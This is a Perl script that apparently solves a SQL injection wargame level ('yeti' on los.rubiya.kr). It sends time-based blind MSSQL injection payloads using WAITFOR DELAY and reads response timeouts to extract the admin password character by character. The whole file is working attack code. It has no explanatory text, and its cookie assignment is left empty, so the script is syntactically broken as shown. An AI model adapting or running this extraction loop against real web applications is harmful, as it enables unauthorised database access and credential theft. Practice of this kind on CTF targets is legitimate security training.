#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

$ENV{PERL_LWP_SSL_CA_FILE} = '/etc/ssl/cert.pem';
$|++;

my @charset = (
  #33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  #58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  #91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  #123 ..  126, # {|}~
);

my $url =
"https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
;

my $cookie =
;

my $ua = LWP::UserAgent->new( timeout => 5 );
my $found = '';
my $index = 0;

while (1) { # unknown pwd length
  $index++;

  for my $ord (@charset) {
    my $char = chr $ord;

    print $char;

    my $payload =
    "?id=admin&pw=' if ((select pw from prob_yeti where id='admin') " .
    "like '${found}${char}%25') WAITFOR DELAY '0:0:7' " .
    "else WAITFOR DELAY '0:0:0'--"
    ;

  CONN:

    my $resp = $ua->get( $url.$payload, 'Cookie' => $cookie );

    if ($resp->is_error) {
      printf "\n[%d] %s\n", $resp->code, $resp->message;

      if ($resp->code == 500 && $resp->message eq 'read timeout') {
        $found .= $char;
        print "\n$index => $char, Total: '$found'\n";
        last;
      } else {
        redo CONN;
      }
    } else {
      $found .= chr 219 if $index == $#charset; # last char and not found
    }
  }
}
# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
